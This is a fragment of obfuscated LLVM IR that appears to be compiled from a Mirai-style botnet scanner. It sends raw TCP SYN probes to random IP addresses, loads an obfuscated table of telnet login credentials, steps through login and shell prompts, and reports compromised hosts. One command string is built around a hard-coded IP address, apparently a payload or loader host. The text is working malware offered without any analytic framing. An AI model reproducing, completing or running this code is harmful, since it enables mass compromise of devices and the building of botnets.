  %2188 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %2187, i32 0, i32 6
  store i16 0, i16* %2188, align 4
  %2189 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %2190 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %2191 = bitcast %struct.tcphdr* %2190 to i8*
  %2192 = call zeroext i16 @htons(i16 zeroext 20) #9
  %2193 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %2189, i8* %2191, i16 zeroext %2192, i32 20)
  %2194 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %2195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %2194, i32 0, i32 6
  store i16 %2193, i16* %2195, align 4
  %2196 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %2196, align 4
  %2197 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %2198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %2197, i32 0, i32 9
  %2199 = load i32, i32* %2198, align 4
  %2200 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %2201 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2200, i32 0, i32 0
  store i32 %2199, i32* %2201, align 4
  %2202 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %2203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %2202, i32 0, i32 1
  %2204 = load i16, i16* %2203, align 2
  %2205 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %2204, i16* %2205, align 2
  %2206 = load i32, i32* @rsck, align 4
  %2207 = bitcast %union.__SOCKADDR_ARG* %20 to %struct.sockaddr**
  %2208 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %2208, %struct.sockaddr** %2207, align 8
  %2209 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %20, i32 0, i32 0
  %2210 = load %struct.sockaddr*, %struct.sockaddr** %2209, align 8
  %2211 = call i64 @sendto(i32 %2206, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %2210, i32 16)
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %361
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %378
  store i32 0, i32* %12, align 4
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %411
  %2212 = call i32* @__errno_location() #9
  %2213 = load i32, i32* %2212, align 4
  %2214 = icmp eq i32 %2213, 11
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %440
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %556
  %2215 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  %2216 = icmp eq %struct.scanner_connection* %2215, null
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %575
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %592
  %2217 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %2218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %2217, i32 0, i32 8
  %2219 = load i32, i32* %2218, align 4
  %2220 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  %2221 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2220, i32 0, i32 15
  store i32 %2219, i32* %2221, align 4
  %2222 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %2223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %2222, i32 0, i32 0
  %2224 = load i16, i16* %2223, align 4
  %2225 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  %2226 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2225, i32 0, i32 13
  store i16 %2224, i16* %2226, align 8
  %2227 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  call void @setup_connection(%struct.scanner_connection* %2227)
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %641
  %2228 = load i32, i32* %1, align 4
  %2229 = icmp slt i32 %2228, 628
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %706
  %2230 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %2230, i32 1)
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %727
  %2231 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2232 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2231, i32 0, i32 9
  store i8 0, i8* %2232, align 4
  %2233 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2234 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2233, i32 0, i32 16
  store i32 0, i32* %2234, align 8
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %779
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %822
  %2235 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2236 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2235, i32 0, i32 2
  %2237 = load i32, i32* %2236, align 8
  store i32 %2237, i32* %14, align 4
  br label %originalBB81

originalBB85alteredBB:                            ; preds = %originalBB85, %843
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %860
  br label %originalBB89

originalBB93alteredBB:                            ; preds = %originalBB93, %880
  %2238 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 0, i64* %2238, align 8
  %2239 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 1, i64* %2239, align 8
  %2240 = load i32, i32* %15, align 4
  %2241 = load i32, i32* %14, align 4
  %2242 = icmp sgt i32 %2240, %2241
  br label %originalBB93

originalBB97alteredBB:                            ; preds = %originalBB97, %902
  %2243 = load i32, i32* %15, align 4
  br label %originalBB97

originalBB101alteredBB:                           ; preds = %originalBB101, %920
  %2244 = load i32, i32* %14, align 4
  br label %originalBB101

originalBB105alteredBB:                           ; preds = %originalBB105, %938
  %_106 = sub i32 1, %939
  %gen107 = mul i32 %_106, %939
  %_108 = shl i32 1, %939
  %2245 = add nsw i32 1, %939
  %2246 = call i32 @select(i32 %2245, %struct.__sigset_t* %8, %struct.__sigset_t* %9, %struct.__sigset_t* null, %struct.timeval* %11)
  %2247 = call i64 @time(i64* null) #7
  %2248 = trunc i64 %2247 to i32
  store i32 %2248, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %originalBB105

originalBB112alteredBB:                           ; preds = %originalBB112, %1021
  %2249 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2250 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2249, i32 0, i32 4
  store i32 0, i32* %2250, align 8
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %1040
  %2251 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %2252 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2253 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2252, i32 0, i32 2
  %2254 = load i32, i32* %2253, align 8
  %_117 = shl i32 %2254, 64
  %_118 = shl i32 %2254, 64
  %_119 = shl i32 %2254, 64
  %_120 = shl i32 %2254, 64
  %_121 = shl i32 %2254, 64
  %_122 = sub i32 0, %2254
  %gen123 = add i32 %_122, 64
  %_124 = shl i32 %2254, 64
  %_125 = sub i32 0, %2254
  %gen126 = add i32 %_125, 64
  %2255 = sdiv i32 %2254, 64
  %2256 = sext i32 %2255 to i64
  %2257 = getelementptr inbounds [16 x i64], [16 x i64]* %2251, i64 0, i64 %2256
  %2258 = load i64, i64* %2257, align 8
  %2259 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2260 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2259, i32 0, i32 2
  %2261 = load i32, i32* %2260, align 8
  %_127 = sub i32 %2261, 64
  %gen128 = mul i32 %_127, 64
  %2262 = srem i32 %2261, 64
  %2263 = zext i32 %2262 to i64
  %_129 = shl i64 1, %2263
  %_130 = sub i64 0, 1
  %gen131 = add i64 %_130, %2263
  %_132 = sub i64 1, %2263
  %gen133 = mul i64 %_132, %2263
  %2264 = shl i64 1, %2263
  %_134 = shl i64 %2258, %2264
  %_135 = sub i64 0, %2258
  %gen136 = add i64 %_135, %2264
  %2265 = and i64 %2258, %2264
  %2266 = icmp ne i64 %2265, 0
  br label %originalBB116

originalBB140alteredBB:                           ; preds = %originalBB140, %1097
  %2267 = call i32* @__errno_location() #9
  store i32 0, i32* %2267, align 4
  %2268 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2269 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2268, i32 0, i32 2
  %2270 = load i32, i32* %2269, align 8
  %2271 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2272 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2271, i32 0, i32 7
  %2273 = getelementptr inbounds [8192 x i8], [8192 x i8]* %2272, i32 0, i32 0
  %2274 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2275 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2274, i32 0, i32 4
  %2276 = load i32, i32* %2275, align 8
  %2277 = sext i32 %2276 to i64
  %2278 = getelementptr inbounds i8, i8* %2273, i64 %2277
  %2279 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2280 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2279, i32 0, i32 4
  %2281 = load i32, i32* %2280, align 8
  %_141 = shl i32 8192, %2281
  %_142 = sub i32 0, 8192
  %gen143 = add i32 %_142, %2281
  %_144 = sub i32 8192, %2281
  %gen145 = mul i32 %_144, %2281
  %_146 = sub i32 8192, %2281
  %gen147 = mul i32 %_146, %2281
  %_148 = shl i32 8192, %2281
  %2282 = sub nsw i32 8192, %2281
  %2283 = call i32 @recv_strip_null(i32 %2270, i8* %2278, i32 %2282, i32 16384)
  store i32 %2283, i32* %34, align 4
  %2284 = load i32, i32* %34, align 4
  %2285 = icmp eq i32 %2284, 0
  br label %originalBB140

originalBB152alteredBB:                           ; preds = %originalBB152, %1133
  %2286 = call i32* @__errno_location() #9
  store i32 104, i32* %2286, align 4
  store i32 -1, i32* %34, align 4
  br label %originalBB152

originalBB156alteredBB:                           ; preds = %originalBB156, %1154
  %2287 = call i32* @__errno_location() #9
  %2288 = load i32, i32* %2287, align 4
  %2289 = icmp ne i32 %2288, 11
  br label %originalBB156

originalBB160alteredBB:                           ; preds = %originalBB160, %1174
  %2290 = call i32* @__errno_location() #9
  %2291 = load i32, i32* %2290, align 4
  %2292 = icmp ne i32 %2291, 11
  br label %originalBB160

originalBB164alteredBB:                           ; preds = %originalBB164, %1213
  %2293 = load i32, i32* %34, align 4
  %2294 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2295 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2294, i32 0, i32 4
  %2296 = load i32, i32* %2295, align 8
  %_165 = sub i32 0, %2296
  %gen166 = add i32 %_165, %2293
  %_167 = sub i32 %2296, %2293
  %gen168 = mul i32 %_167, %2293
  %_169 = shl i32 %2296, %2293
  %_170 = shl i32 %2296, %2293
  %_171 = sub i32 %2296, %2293
  %gen172 = mul i32 %_171, %2293
  %2297 = add nsw i32 %2296, %2293
  store i32 %2297, i32* %2295, align 8
  %2298 = load i32, i32* @fake_time, align 4
  %2299 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2300 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2299, i32 0, i32 3
  store i32 %2298, i32* %2300, align 4
  br label %originalBB164

originalBB176alteredBB:                           ; preds = %originalBB176, %1242
  %2301 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2302 = call i32 @consume_iacs(%struct.scanner_connection* %2301)
  store i32 %2302, i32* %35, align 4
  %2303 = icmp sgt i32 %2302, 0
  br label %originalBB176

originalBB180alteredBB:                           ; preds = %originalBB180, %1266
  %2304 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2305 = call i32 @consume_login_prompt(%struct.scanner_connection* %2304, i32 1)
  store i32 %2305, i32* %35, align 4
  %2306 = icmp sgt i32 %2305, 0
  br label %originalBB180

originalBB184alteredBB:                           ; preds = %originalBB184, %1299
  %2307 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2308 = call i32 @consume_login_prompt(%struct.scanner_connection* %2307, i32 0)
  store i32 %2308, i32* %35, align 4
  %2309 = icmp sgt i32 %2308, 0
  br label %originalBB184

originalBB188alteredBB:                           ; preds = %originalBB188, %1331
  br label %originalBB188

originalBB192alteredBB:                           ; preds = %originalBB192, %1348
  %2310 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2311 = call i32 @consume_shell_prompt(%struct.scanner_connection* %2310)
  store i32 %2311, i32* %35, align 4
  %2312 = icmp sgt i32 %2311, 0
  br label %originalBB192

originalBB196alteredBB:                           ; preds = %originalBB196, %1368
  call void @table_unlock_val(i8 zeroext 11)
  %2313 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2314 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2313, i32 0, i32 2
  %2315 = load i32, i32* %2314, align 8
  %2316 = call i32 (i32, i8*, ...) @fdsend(i32 %2315, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.105, i32 0, i32 0))
  %2317 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2318 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2317, i32 0, i32 2
  %2319 = load i32, i32* %2318, align 8
  %2320 = call i8* @table_retrieve_val(i32 11, i32* null)
  %2321 = call i32 (i32, i8*, ...) @fdsend(i32 %2319, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.106, i32 0, i32 0), i8* %2320)
  call void @table_lock_val(i8 zeroext 11)
  %2322 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2323 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2322, i32 0, i32 16
  store i32 6, i32* %2323, align 8
  br label %originalBB196

originalBB200alteredBB:                           ; preds = %originalBB200, %1412
  %2324 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %2324, i32 1)
  br label %originalBB200

originalBB204alteredBB:                           ; preds = %originalBB204, %1434
  br label %originalBB204

originalBB208alteredBB:                           ; preds = %originalBB208, %1455
  %2325 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2326 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2325, i32 0, i32 5
  store i32 0, i32* %2326, align 4
  %2327 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2328 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2327, i32 0, i32 1
  %2329 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %2328, i32 0, i32 0
  %2330 = load i32, i32* %2329, align 8
  %2331 = icmp ne i32 %2330, 0
  br label %originalBB208

originalBB212alteredBB:                           ; preds = %originalBB212, %1498
  call void @table_unlock_val(i8 zeroext 11)
  %2332 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2333 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2332, i32 0, i32 2
  %2334 = load i32, i32* %2333, align 8
  %2335 = call i8* @table_retrieve_val(i32 11, i32* null)
  %2336 = call i32 (i32, i8*, ...) @fdsend(i32 %2334, i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.110, i32 0, i32 0), i8* %2335)
  call void @table_lock_val(i8 zeroext 11)
  %2337 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2338 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2337, i32 0, i32 16
  store i32 8, i32* %2338, align 8
  br label %originalBB212

originalBB217alteredBB:                           ; preds = %originalBB217, %1531
  br label %originalBB217

originalBB221alteredBB:                           ; preds = %originalBB221, %1557
  %2339 = load i32, i32* %35, align 4
  %2340 = icmp eq i32 %2339, -1
  br label %originalBB221

originalBB225alteredBB:                           ; preds = %originalBB225, %1580
  br label %originalBB225

originalBB229alteredBB:                           ; preds = %originalBB229, %1597
  br label %originalBB229

originalBB233alteredBB:                           ; preds = %originalBB233, %1614
  %2341 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2342 = call i32 @consume_arm_subtype(%struct.scanner_connection* %2341)
  store i32 %2342, i32* %35, align 4
  %2343 = icmp sgt i32 %2342, 0
  br label %originalBB233

originalBB237alteredBB:                           ; preds = %originalBB237, %1656
  %2344 = load i32, i32* %36, align 4
  %2345 = icmp slt i32 %2344, 15
  br label %originalBB237

originalBB241alteredBB:                           ; preds = %originalBB241, %1708
  %2346 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2347 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2346, i32 0, i32 8
  %2348 = getelementptr inbounds [16 x i8], [16 x i8]* %2347, i32 0, i32 0
  %2349 = call i32 @strcmp(i8* %2348, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i32 0, i32 0)) #10
  %2350 = icmp eq i32 %2349, 0
  br label %originalBB241

originalBB245alteredBB:                           ; preds = %originalBB245, %1755
  call void @table_unlock_val(i8 zeroext 11)
  %2351 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2352 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2351, i32 0, i32 1
  %2353 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %2352, i32 0, i32 1
  %2354 = load i32, i32* %2353, align 4
  br label %originalBB245

originalBB249alteredBB:                           ; preds = %originalBB249, %1791
  %2355 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2356 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2355, i32 0, i32 2
  %2357 = load i32, i32* %2356, align 8
  %2358 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2359 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2358, i32 0, i32 8
  %2360 = getelementptr inbounds [16 x i8], [16 x i8]* %2359, i32 0, i32 0
  %2361 = call i8* @table_retrieve_val(i32 11, i32* null)
  %2362 = call i32 (i32, i8*, ...) @fdsend(i32 %2357, i8* getelementptr inbounds ([121 x i8], [121 x i8]* @.str.121, i32 0, i32 0), i8* %2360, i32 176, i32 107, i32 133, i32 208, i8* %2361)
  br label %originalBB249

originalBB253alteredBB:                           ; preds = %originalBB253, %1822
  %2363 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2364 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2363, i32 0, i32 16
  store i32 13, i32* %2364, align 8
  br label %originalBB253

originalBB257alteredBB:                           ; preds = %originalBB257, %1844
  br label %originalBB257

originalBB261alteredBB:                           ; preds = %originalBB261, %1862
  %2365 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2366 = call i32 @consume_resp_prompt(%struct.scanner_connection* %2365)
  store i32 %2366, i32* %35, align 4
  %2367 = icmp sgt i32 %2366, 0
  br label %originalBB261

originalBB265alteredBB:                           ; preds = %originalBB265, %1887
  %2368 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %2368, i32 1)
  br label %originalBB265

originalBB269alteredBB:                           ; preds = %originalBB269, %1910
  %2369 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %2369, i32 1)
  br label %originalBB269

originalBB273alteredBB:                           ; preds = %originalBB273, %1983
  %2370 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2371 = call i32 @consume_method_resonse(%struct.scanner_connection* %2370)
  store i32 %2371, i32* %35, align 4
  %2372 = icmp sgt i32 %2371, 0
  br label %originalBB273

originalBB277alteredBB:                           ; preds = %originalBB277, %2003
  %2373 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2374 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2373, i32 0, i32 15
  %2375 = load i32, i32* %2374, align 4
  %2376 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2377 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2376, i32 0, i32 13
  %2378 = load i16, i16* %2377, align 8
  %2379 = zext i16 %2378 to i32
  %2380 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @report_working(i32 %2375, i32 %2379, %struct.scanner_connection* %2380, i32 1)
  %2381 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %2381, i32 1)
  br label %originalBB277

originalBB281alteredBB:                           ; preds = %originalBB281, %2043
  %2382 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %2382, i32 1)
  br label %originalBB281

originalBB285alteredBB:                           ; preds = %originalBB285, %2095
  %2383 = load i32, i32* %35, align 4
  %2384 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2385 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2384, i32 0, i32 4
  %2386 = load i32, i32* %2385, align 8
  %_286 = sub i32 %2386, %2383
  %gen287 = mul i32 %_286, %2383
  %_288 = sub i32 %2386, %2383
  %gen289 = mul i32 %_288, %2383
  %_290 = shl i32 %2386, %2383
  %_291 = sub i32 %2386, %2383
  %gen292 = mul i32 %_291, %2383
  %_293 = sub i32 0, %2386
  %gen294 = add i32 %_293, %2383
  %_295 = shl i32 %2386, %2383
  %_296 = sub i32 %2386, %2383
  %gen297 = mul i32 %_296, %2383
  %2387 = sub nsw i32 %2386, %2383
  store i32 %2387, i32* %2385, align 8
  %2388 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2389 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2388, i32 0, i32 7
  %2390 = getelementptr inbounds [8192 x i8], [8192 x i8]* %2389, i32 0, i32 0
  %2391 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2392 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2391, i32 0, i32 7
  %2393 = getelementptr inbounds [8192 x i8], [8192 x i8]* %2392, i32 0, i32 0
  %2394 = load i32, i32* %35, align 4
  %2395 = sext i32 %2394 to i64
  %2396 = getelementptr inbounds i8, i8* %2393, i64 %2395
  %2397 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2398 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2397, i32 0, i32 4
  %2399 = load i32, i32* %2398, align 8
  %2400 = sext i32 %2399 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2390, i8* %2396, i64 %2400, i32 1, i1 false)
  %2401 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2402 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2401, i32 0, i32 7
  %2403 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %2404 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2403, i32 0, i32 4
  %2405 = load i32, i32* %2404, align 8
  %2406 = sext i32 %2405 to i64
  %2407 = getelementptr inbounds [8192 x i8], [8192 x i8]* %2402, i64 0, i64 %2406
  store i8 0, i8* %2407, align 1
  br label %originalBB285
}

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: noinline nounwind uwtable
define internal void @add_auth_entry(i8*, i8*, i16 zeroext) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i16 %2, i16* %6, align 2
  %8 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %9 = bitcast %struct.scanner_auth* %8 to i8*
  %10 = load i32, i32* @auth_table_len, align 4
  %11 = add nsw i32 %10, 1
  %12 = sext i32 %11 to i64
  %13 = mul i64 %12, 24
  %14 = call i8* @realloc(i8* %9, i64 %13) #7
  %15 = bitcast i8* %14 to %struct.scanner_auth*
  store %struct.scanner_auth* %15, %struct.scanner_auth** @auth_table, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call i8* @deobf(i8* %16, i32* %7)
  %18 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %19 = load i32, i32* @auth_table_len, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %18, i64 %20
  %22 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i32 0, i32 0
  store i8* %17, i8** %22, align 8
  %23 = load i32, i32* %7, align 4
  %24 = trunc i32 %23 to i8
  %25 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %26 = load i32, i32* @auth_table_len, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %25, i64 %27
  %29 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i32 0, i32 4
  store i8 %24, i8* %29, align 4
  %30 = load i8*, i8** %5, align 8
  %31 = call i8* @deobf(i8* %30, i32* %7)
  %32 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %33 = load i32, i32* @auth_table_len, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %32, i64 %34
  %36 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %35, i32 0, i32 1
  store i8* %31, i8** %36, align 8
  %37 = load i32, i32* %7, align 4
  %38 = trunc i32 %37 to i8
  %39 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %40 = load i32, i32* @auth_table_len, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %39, i64 %41
  %43 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %42, i32 0, i32 5
  store i8 %38, i8* %43, align 1
  %44 = load i16, i16* @auth_table_max_weight, align 2
  %45 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %46 = load i32, i32* @auth_table_len, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %45, i64 %47
  %49 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %48, i32 0, i32 2
  store i16 %44, i16* %49, align 8
  %50 = load i16, i16* @auth_table_max_weight, align 2
  %51 = zext i16 %50 to i32
  %52 = load i16, i16* %6, align 2
  %53 = zext i16 %52 to i32
  %54 = add nsw i32 %51, %53
  %55 = trunc i32 %54 to i16
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %57 = load i32, i32* @auth_table_len, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* @auth_table_len, align 4
  %59 = sext i32 %57 to i64
  %60 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i64 %59
  %61 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %60, i32 0, i32 3
  store i16 %55, i16* %61, align 2
  %62 = load i16, i16* %6, align 2
  %63 = zext i16 %62 to i32
  %64 = load i16, i16* @auth_table_max_weight, align 2
  %65 = zext i16 %64 to i32
  %66 = add nsw i32 %65, %63
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4 x i8], align 1
  %3 = alloca i32, align 4
  br label %4

; <label>:4:                                      ; preds = %47, %0
  %5 = call i32 @rand_next()
  %6 = urem i32 %5, 255
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  store i8 %7, i8* %8, align 1
  %9 = call i32 @rand_next()
  %10 = urem i32 %9, 255
  %11 = trunc i32 %10 to i8
  %12 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  store i8 %11, i8* %12, align 1
  %13 = call i32 @rand_next()
  %14 = urem i32 %13, 255
  %15 = trunc i32 %14 to i8
  %16 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  store i8 %15, i8* %16, align 1
  %17 = call i32 @rand_next()
  %18 = urem i32 %17, 255
  %19 = trunc i32 %18 to i8
  %20 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  store i8 %19, i8* %20, align 1
  br label %21

; <label>:21:                                     ; preds = %4
  %22 = load i32, i32* @x.11
  %23 = load i32, i32* @y.12
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  %31 = load i8, i8* %30, align 1
  %32 = zext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
